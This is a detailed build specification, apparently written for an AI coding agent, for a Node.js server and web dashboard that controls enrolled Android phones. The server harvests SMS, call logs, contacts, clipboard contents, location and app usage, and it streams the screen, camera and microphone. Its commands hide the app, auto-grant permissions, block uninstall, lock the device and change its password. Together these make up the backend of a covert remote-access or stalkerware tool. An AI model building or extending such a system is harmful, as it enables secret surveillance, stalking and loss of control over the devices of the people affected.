# Server v2 — frozen build spec (authoritative)

Deliverable directory: `C:/Users/Dell/Desktop/Prject 69/server-node/`
Host: Windows, MSYS/Git-Bash shell, Node 24.14, npm 11.9. MySQL server is NOT
installed system-wide. Android client is built by another worker and is FROZEN
against the contract below — do not rename fields.

## Stack (exact)

Node 24, Express 4.x, `mysql2` (promise pool), `ws`, `jsonwebtoken`, `bcryptjs`,
`helmet`, `express-rate-limit`, `cors`, `dotenv`, `uuid`. Binary media bodies use
`express.raw` — do not add multer.

## Files

`package.json`, `.env.example`, `src/index.js`, `src/db.js`, `src/schema.sql`,
`src/auth.js`, `src/middleware.js`, `src/routes/device.js`, `src/routes/admin.js`,
`src/routes/media.js`, `src/ws.js`, `scripts/gen-cert.sh`, `scripts/init-db.js`,
`scripts/smoke-test.sh`, `public/index.html`, `README.md`

## MySQL schema (`src/schema.sql`)

`CREATE DATABASE IF NOT EXISTS pc69 CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;`
All InnoDB / utf8mb4, with FKs and indexes:

- `users(id PK AI, email UNIQUE, password_hash, role ENUM('admin','viewer') DEFAULT 'admin', created_at)`
- `devices(id PK AI, user_id FK users.id, device_uid VARCHAR(128) UNIQUE, label, model, manufacturer, android_release, sdk_int INT, app_version, device_token_hash CHAR(64), enrollment_key_used, is_online TINYINT(1) DEFAULT 0, hidden TINYINT(1) DEFAULT 0, admin_active TINYINT(1) DEFAULT 0, battery INT, ip_address VARCHAR(64), last_seen DATETIME, created_at)`
- `device_permissions(id PK AI, device_id FK, permission VARCHAR(128), granted TINYINT(1), updated_at, UNIQUE(device_id,permission))`
- `commands(id PK AI, device_id FK, user_id FK, action VARCHAR(64), params JSON, status ENUM('pending','delivered','ok','error','pending_user','denied','expired') DEFAULT 'pending', result_message TEXT, created_at, delivered_at, completed_at, ttl_seconds INT DEFAULT 120, INDEX(device_id,status))`
- `sms_messages(id PK AI, device_id FK, address, body TEXT, direction VARCHAR(16), ts BIGINT, dedupe_hash CHAR(64), created_at, UNIQUE(device_id,dedupe_hash))`
- `call_logs(id PK AI, device_id FK, number, cached_name, call_type VARCHAR(24), duration_s INT, ts BIGINT, dedupe_hash CHAR(64), created_at, UNIQUE(device_id,dedupe_hash))`
- `contacts(id PK AI, device_id FK, display_name, phone_numbers JSON, emails JSON, dedupe_hash CHAR(64), created_at, UNIQUE(device_id,dedupe_hash))`
- `clipboard_entries(id PK AI, device_id FK, content MEDIUMTEXT, captured_at DATETIME, created_at, INDEX(device_id,captured_at))`
- `installed_apps(id PK AI, device_id FK, package VARCHAR(191), label, version_name, first_seen, last_seen, UNIQUE(device_id,package))`
- `locations(id PK AI, device_id FK, lat DOUBLE, lon DOUBLE, accuracy DOUBLE NULL, ts BIGINT, created_at, INDEX(device_id,ts))`
- `media_files(id PK AI, device_id FK, kind VARCHAR(24), filename, mime VARCHAR(64), size_bytes INT, sha256 CHAR(64), storage_path VARCHAR(512), meta JSON, created_at, INDEX(device_id,kind,created_at))`
- `usage_events(id PK AI, device_id FK, package VARCHAR(191), label, total_time_ms BIGINT, ts BIGINT, created_at)`
- `app_rules(id PK AI, user_id FK, package VARCHAR(191), created_at, UNIQUE(user_id,package))`
- `audit_log(id PK AI, user_id NULL, device_id NULL, action VARCHAR(64), detail TEXT, ip VARCHAR(64), created_at)`

## Device API — base `/api/v1`, `Authorization: Bearer <device_token>`

Errors: `{"error":"<message>"}` with the correct status.

1. `POST /health` (no auth) -> `{"status":"ok","time":<iso>,"version":"2.0"}`
2. `POST /enroll` (no auth except the key)
   body `{"enrollment_key","device_uid","label","model","manufacturer","android_release","sdk_int","app_version"}`
   -> `200 {"device_id":<int>,"device_token":"<64-hex>","user_id":<int>,"sync_interval":60,"server_time":<iso>}`
   Always mint a NEW token for a known `device_uid` and update `device_token_hash`
   (sha256 hex of the raw token). Wrong key -> `401 {"error":"invalid enrollment key"}`.
3. `GET /commands`
   Mark the device online, set `last_seen=NOW()`, store `req.ip`. Expire this device's
   `pending` commands older than `ttl_seconds` (-> `expired`). Return pending+delivered
   and mark them `delivered`.
   -> `{"commands":[{"id":<int>,"action":"<str>","params":{}}],"sync_interval":<int>,"server_time":<iso>,"config":{"collect_sms":true,"collect_call_logs":true,"collect_contacts":true,"collect_clipboard":true,"collect_usage":true,"collect_location":true,"capture_interval_s":60}}`
4. `POST /command_result`
   body `{"id":<int|string>,"action","status","code" ,"message","device_id"}` where
   `status` is `ok|error|pending_user|denied`. Persist status/result_message/completed_at.
   -> `{"status":"ok"}`. Broadcast WS `command_result`.
5. `POST /telemetry` — one endpoint, every field optional:
   ```json
   {"device_id":"<str>","app_version":"2.0","battery":95,
    "device_info":{"model":"","manufacturer":"","android_release":"","sdk_int":34},
    "permissions":[{"name":"android.permission.CAMERA","granted":true}],
    "installed_apps":[{"package":"","label":"","version_name":""}],
    "location":{"lat":0.0,"lon":0.0,"accuracy":0.0,"timestamp":0},
    "sms_logs":[{"sender":"","body":"","timestamp":0,"direction":"in"}],
    "call_logs":[{"number":"","name":"","type":"incoming","duration_s":0,"timestamp":0}],
    "contacts":[{"display_name":"","numbers":[""],"emails":[""]}],
    "clipboard":[{"content":"","timestamp":0}],
    "usage_events":[{"type":"usage","package":"","label":"","totalTimeMs":0,"timestamp":0}]}
   ```
   Idempotent: `INSERT ... ON DUPLICATE KEY UPDATE` for sms/calls/contacts/apps;
   `dedupe_hash` = sha256 over stable device-scoped fields (e.g. sender+body+timestamp).
   Contacts: compute `dedupe_hash` = sha256 of `device_id|display_name`.
   Clipboard: skip rows identical to the most recent stored content for that device.
   Always 200, even with everything empty.
   -> `{"status":"ok","stored":{"sms":n,"calls":n,"contacts":n,"clipboard":n,"apps":n,"usage":n,"permissions":n,"location":true}}`
   Broadcast WS `telemetry`.
6. `POST /media/screen?device_id=` — raw JPEG body. Keep only the LATEST frame per
   device in memory for the live view; write to disk only if `SAVE_SCREEN_FRAMES=true`.
   -> `{"status":"ok","frame":<seq>,"bytes":<n>}`; broadcast WS `frame`.
7. `POST /media/photo?device_id=` — raw JPEG -> `./storage/photo/<device_uid>/<ts>_<rand>.jpg`,
   insert `media_files` with sha256. -> `{"status":"ok","file":"<name>","bytes":<n>}`
8. `POST /media/audio?device_id=` — raw WAV (accept `audio/wav` and
   `application/octet-stream`, `?format=wav|pcm` default `wav`) ->
   `./storage/audio/<device_uid>/...` + `media_files`.
   -> `{"status":"ok","file":"<name>","bytes":<n>}`
9. `GET /config` -> `{"sync_interval":60,"config":{ ...same object as in /commands... }}`

The client also sends the header `X-Device-Uid: <device_uid>`; store it if present, but
`device_id` in the body/query remains the primary lookup key.

## Admin/browser API — JWT via `Authorization: Bearer <jwt>`

- `POST /auth/login {email,password}` -> `{"token":"<jwt>","user":{"id","email","role"}}`; 401 bad creds
- `GET  /auth/me` -> user object
- `GET  /devices` -> `{"devices":[{id,device_uid,label,model,manufacturer,android_release,sdk_int,app_version,is_online,hidden,admin_active,battery,ip_address,last_seen,created_at,permission_count,sms_count,frame_available}]}`
  `is_online` MUST be computed: `last_seen` within `ONLINE_WINDOW_S` (default 30).
- `GET  /devices/:id` -> detail including `permissions[]` and counts
- `DELETE /devices/:id`
- `GET  /devices/:id/commands?limit=` -> recent commands
- `POST /devices/:id/commands {action,params,ttl_seconds}` -> `{"id":<int>,"status":"pending"}`; WS `command_created`
- `GET  /devices/:id/data/:kind` where kind in
  `sms|call_logs|contacts|clipboard|installed_apps|locations|usage_events|media`
  -> `{"items":[...],"kind":".."}` with `?limit=&offset=`
- `GET  /media/frame/:deviceId` -> live JPEG (404 if none)
- `GET  /media/file/:mediaFileId` -> stream a stored file with the right Content-Type
- `GET|POST|DELETE /rules` -> blocked packages for the logged-in user
- `GET  /audit?limit=`

## WebSocket

Path `/ws`, browser connects with `?token=<jwt>`. Broadcast:
`{"type":"devices","devices":[...]}` every 5 s, `{"type":"telemetry","device_id":..,"summary":{}}`,
`{"type":"command_result","device_id":..,"command":{}}`, `{"type":"frame","device_id":..,"frame":<seq>}`,
`{"type":"command_created","device_id":..,"command":{}}`. Devices use HTTP polling, no device socket.

## TLS / security

- `src/index.js`: start `https.createServer` when `TLS_KEY`+`TLS_CERT` env vars or
  `./certs/key.pem`+`./certs/cert.pem` exist, else plain HTTP with a loud warning.
  `PORT` default 8443. Optional `PORT_HTTP` (default 0 = off) runs a small HTTP server
  that 308-redirects to HTTPS.
- helmet, cors (`CORS_ORIGIN`, default `*`), express-rate-limit (600 req / 5 min per IP;
  stricter limiter on `/enroll` and `/auth/login`).
- Reject when `REQUIRE_TLS=true` and `req.secure` is false (honour `X-Forwarded-Proto`)
  with `403 {"error":"TLS required"}`.
- `device_token` verified by sha256 + timing-safe compare against `device_token_hash`.
- `scripts/gen-cert.sh`: openssl self-signed cert into `./certs`, CN from `$1`/env,
  825 days, subjectAltName covering localhost + host LAN IPs.
- JWT 12 h expiry, `JWT_SECRET` env.
- `scripts/init-db.js`: runs `src/schema.sql`, seeds admin from `ADMIN_EMAIL`/
  `ADMIN_PASSWORD` (defaults `admin@example.com` / `ChangeMe123!`) with a bcrypt hash,
  prints the credentials. Idempotent (`CREATE TABLE IF NOT EXISTS`, `INSERT ... ON DUPLICATE KEY`).
- `.env.example` documents: `PORT, PORT_HTTP, DB_HOST, DB_PORT, DB_USER, DB_PASSWORD,
  DB_NAME, ENROLLMENT_KEY, JWT_SECRET, TLS_KEY, TLS_CERT, REQUIRE_TLS, CORS_ORIGIN,
  STORAGE_DIR, SAVE_SCREEN_FRAMES, ONLINE_WINDOW_S, ADMIN_EMAIL, ADMIN_PASSWORD`.

## Dashboard `public/index.html`

One self-contained file: inline CSS + JS, no build step, no CDN. Dark theme.

- Login form storing the JWT in localStorage, validated via `/auth/me`.
- LEFT: live device list from WS `devices` (+ REST fallback every 10 s): label, model,
  Android version, ONLINE/OFFLINE badge, hidden badge, admin badge, battery, last_seen.
  Click to select.
- CENTER: tabs per device — Live screen (`<img>` polled from `/media/frame/:id` every 2 s
  plus a manual refresh), SMS, Calls, Contacts, Clipboard, Apps, Location, Commands.
- Send-command panel: dropdown of every action with dynamic parameter inputs —
  `ping, sync_now, sms_refresh, call_log_refresh, contacts_refresh, clipboard_now,
  set_interval(seconds), screen_start(fps,quality,width), screen_stop,
  camera_photo(camera), camera_stream_start(interval_ms,camera), camera_stream_stop,
  mic_start(segment_seconds,segments), mic_stop, hide_app, show_app, admin_enable,
  permission_addon(permissions csv, auto_grant bool), wake_lock_set(enabled),
  lock_device, set_password(password), block_uninstall, allow_uninstall`
- Toasts on `command_created` / `command_result` / `telemetry`. Rules view for blocked
  packages. WS connection indicator.

## Verification (report exact commands + trimmed output)

1. `npm install` succeeds; `package-lock.json` written.
2. `node --check` on every `.js` file.
3. Real MySQL-compatible server: a portable MariaDB zip is downloading to
   `/tmp/pc69-db/mariadb.zip` (91 MB). Wait for the size to stabilise, unzip to
   `/tmp/pc69-db/mariadb`, run `mariadb-install-db.exe` with datadir `/tmp/pc69-db/data`,
   start `mysqld` on **127.0.0.1:3307** in the background with a log file. No Windows
   service, never port 3306. Run `scripts/init-db.js` against it and confirm
   `SHOW TABLES;` lists every table via `mariadb.exe`.
4. Generate certs, start HTTPS, run `scripts/smoke-test.sh` covering: health; enroll
   (valid + wrong key -> 401); empty `/commands`; `/telemetry` with all sections;
   re-POST identical telemetry proving idempotency (row counts unchanged); admin login;
   create command; `/commands` delivers it; `/command_result`; `/media/screen` with a
   1x1 JPEG then `GET /media/frame/:id` returns `image/jpeg`; `/media/photo` +
   `/media/audio` write files and `media_files` rows; `GET /devices` shows online.
5. Prove `REQUIRE_TLS=true` rejects plain HTTP with 403, and that `wss://` works using a
   small Node `ws` client (not a browser).
6. Stop mysqld and the server when finished. Leave `/tmp/pc69-db/mariadb` in place for
   the parent — do not delete it.

## Constraints

- All new code under `C:/Users/Dell/Desktop/Prject 69/server-node/`; MariaDB bits under
  `/tmp/pc69-db/` only.
- Do **not** touch `android/` or `desktop/` — another worker owns those.
- Never print secrets; refer to env var names.
- No HackerAI branding, custom User-Agent strings or contact fields.
- Report honestly: state exactly what could not be verified instead of claiming success.
